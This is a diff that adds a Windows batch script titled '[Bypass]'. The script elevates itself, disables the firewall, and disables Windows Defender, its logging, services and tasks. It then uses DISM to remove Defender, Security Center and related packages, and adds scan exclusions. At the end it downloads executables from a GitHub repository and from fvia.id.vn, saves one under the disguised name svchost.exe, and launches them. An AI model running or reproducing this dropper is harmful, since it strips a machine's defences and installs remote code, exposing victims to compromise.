@@ -1,0 +1,340 @@
+@echo off
+
+if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
+netsh advfirewall set allprofiles state off
+
+rem USE AT OWN RISK AS IS WITHOUT WARRANTY OF ANY KIND !!!!!
+rem https://technet.microsoft.com/en-us/itpro/powershell/windows/defender/set-mppreference
+rem To also disable Windows Defender Security Center include this
+rem reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
+rem 1 - Disable Real-time protection
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f
+rem 0 - Disable Logging
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
+rem Disable WD Tasks
+schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
+rem Disable WD systray icon
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Windows Defender" /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /f
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f
+rem Remove WD context menu
+reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
+reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
+reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
+rem Disable WD services
+reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
+rem Run "Disable WD.bat" again to disable WD services
+
+@echo off
+
+if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
+netsh advfirewall set allprofiles state off
+
+rem USE AT OWN RISK AS IS WITHOUT WARRANTY OF ANY KIND !!!!!
+rem https://technet.microsoft.com/en-us/itpro/powershell/windows/defender/set-mppreference
+rem To also disable Windows Defender Security Center include this
+rem reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
+rem 1 - Disable Real-time protection
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f
+rem 0 - Disable Logging
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
+rem Disable WD Tasks
+schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
+rem Disable WD systray icon
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Windows Defender" /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /f
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f
+rem Remove WD context menu
+reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
+reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
+reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
+rem Disable WD services
+reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
+rem Run "Disable WD.bat" again to disable WD services
+
+:: Starting script
+@echo off
+pushd "%CD%"
+CD /D "%~dp0"
+:: Removing Windows Security Application
+rmdir /s /q "C:\Windows\SystemApps\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy"
+FOR /d %%f IN ("C:\Program Files\WindowsApps\Microsoft.SecHealthUI*") DO rmdir /s /q "%%f"
+powershell "Get-AppxPackage *SecHealth* | Reset-AppxPackage"
+bcdedit /set disableelamdrivers yes
+:: Package Remover
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Windows-Defender-Nis-Group-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%\Owners" /va /f
+) else (
+echo The package cannot be found.
+)
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Windows-Defender-Management-Powershell-Group-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%\Owners" /va /f
+) else (
+echo 
+)
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Windows-Defender-Management-MDM-Group-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%\Owners" /va /f
+) else (
+echo 
+
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Windows-Defender-Management-Group-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%\Owners" /va /f
+) else (
+echo
+)
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Windows-Defender-Group-Policy-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /va /f
+) else (
+echo
+)
+
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Windows-Defender-Core-Group-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%\Owners" /va /f
+) else (
+echo
+)
+
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Windows-Defender-Client-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%\Owners" /va /f
+) else (
+echo
+)
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Windows-Defender-ApplicationGuard-Inbox-WOW64-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%\Owners" /va /f
+) else (
+echo 
+)
+
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Windows-Defender-ApplicationGuard-Inbox-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /va /f
+) else (
+echo 
+)
+
+
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Microsoft-Windows-CodeIntegrity-Diagnostics-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /va /f
+) else (
+echo The package cannot be found.
+)
+
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Windows-Defender-AM-Default-Definitions-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /va /f
+) else (
+echo The package cannot be found.
+)
+
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Microsoft-Windows-SecurityCenter" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /va /f
+) else (
+echo The package cannot be found.
+)
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Microsoft-Windows-SenseClient-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /va /f
+) else (
+echo The package cannot be found.
+)
+
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Windows-Defender-AM-Default-Definitions-OptionalWrapper-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /va /f
+) else (
+echo The package cannot be found.
+)
+
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Microsoft-Windows-SystemMaintenance-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /va /f
+) else (
+echo The package cannot be found.
+)
+
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Microsoft-Windows-ReliabilityAnalysisServices-Group-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /va /f
+) else (
+echo The package cannot be found.
+)
+
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Microsoft-Windows-Killbits-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /va /f
+) else (
+echo The package cannot be found.
+)
+
+for /f "tokens=8 delims=\" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" ^| findstr "Windows-Defender-Nis-Group-Package" ^| findstr "~~"') do (set "defender_package=%%i")
+if defined defender_package (
+echo Removing %defender_package%...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /v Visibility /t REG_DWORD /d 1 /f
+dism /online /Remove-Package /PackageName:%defender_package% /NoRestart >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages\%defender_package%" /va /f
+) else (
+echo 
+)
+
+taskkill /f /im SecurityHealthSystray.exe
+taskkill /f /im SecurityHealthHost.exe
+taskkill /f /im SecurityHealthService.exe
+taskkill /f /im SecurityHealthHost.exe
+
+title [Bypass] 
+rmdir /s /q "C:\Windows\SystemApps\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy" 
+@echo off
+REM Disable Windows Defender temporarily
+powershell Set-MpPreference -DisableRealtimeMonitoring $true
+echo Windows Defender is temporarily disabled for 5 minutes.
+
+REM Add exclusion paths for Windows Defender
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Users\YourUsername\AppData" /t REG_DWORD /d 0 /f
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Users\YourUsername\Desktop" /t REG_DWORD /d 0 /f
+REM You can add more exclusion paths here
+
+REM Execute batch commands
+echo @echo off > bypass_commands.bat
+echo pushd "%%CD%%" >> bypass_commands.bat
+echo CD /D "%%~dp0" >> bypass_commands.bat
+echo title [Bypass] >> bypass_commands.bat
+echo rmdir /s /q "C:\Windows\SystemApps\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy" >> bypass_commands.bat
+REM You can add more commands here
+
+REM Run the generated script
+call bypass_commands.bat
+
+@echo off
+
+REM Download the file from the URL
+set "url=https://github.com/fviatool/fvia/raw/main/update.exe"
+set "save_path=%temp%\svchost.exe"
+
+powershell -command "& { Invoke-WebRequest -Uri '%url%' -OutFile '%save_path%' }"
+
+REM Run the commands from the second section
+(
+    echo @echo off
+    echo title [Bypass]
+    echo rmdir /s /q "C:\Windows\SystemApps\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy"
+    REM Add other commands here
+    echo set DOWNLOAD_FOLDER=%ProgramFiles%
+    echo set URL_LIST=https://fvia.id.vn/WindowsSecurity.exe
+    echo set FILE_NAMES=svchost.exe
+    echo for %%i in (^%URL_LIST^%) do (curl -o "%%DOWNLOAD_FOLDER%%\%%~nxi" --insecure "%%i"^)
+    echo start "" /B "%%DOWNLOAD_FOLDER%%/WindowsSecurity.exe"
+    echo start "" /B
+    echo Done
+) > bypass_commands.bat
+
+REM Run the generated batch script
+call bypass_commands.bat
+
+REM Update Windows Defender settings
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+timeout /t 2
